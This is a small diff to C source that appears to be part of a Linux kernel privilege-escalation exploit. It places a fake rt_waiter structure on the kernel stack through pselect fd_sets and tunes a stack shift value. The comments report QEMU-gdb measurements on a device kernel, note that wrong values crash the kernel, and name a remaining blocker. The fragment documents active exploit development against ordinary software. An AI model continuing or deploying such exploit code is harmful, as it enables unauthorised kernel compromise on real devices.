@@ -173,11 +173,11 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   }
 }
 
-/* Shift sweep, reboot-resumable. A misaligned shift may Oops the kernel (the
- * walk derefs a garbage waiter->lock), so persist the next sweep index to a file
- * next to the log: a reboot resumes at the NEXT shift instead of re-crashing the
- * same one. -2 first (known-survivable), then out toward the crash boundary. */
-static const int kShiftSweep[] = {-2, -1, 0, 1, 2};
+/* QEMU-gdb PROVED shift=-2 is exactly correct (rt_waiter == stack_fds ==
+ * SP_DIV-0x210, measured in the device kernel: fake-waiter word0 at stack_fds+0
+ * lands on rt_waiter+0). So the sweep is fixed at -2 now; the walk_wrote=0 blocker
+ * is NOT the shift. (Infra kept for future re-sweeps; add values to re-enable.) */
+static const int kShiftSweep[] = {-2};
 #define SHIFT_SWEEP_N ((int)(sizeof(kShiftSweep) / sizeof(kShiftSweep[0])))
 
 static void shift_idx_path(char *out, size_t n) {
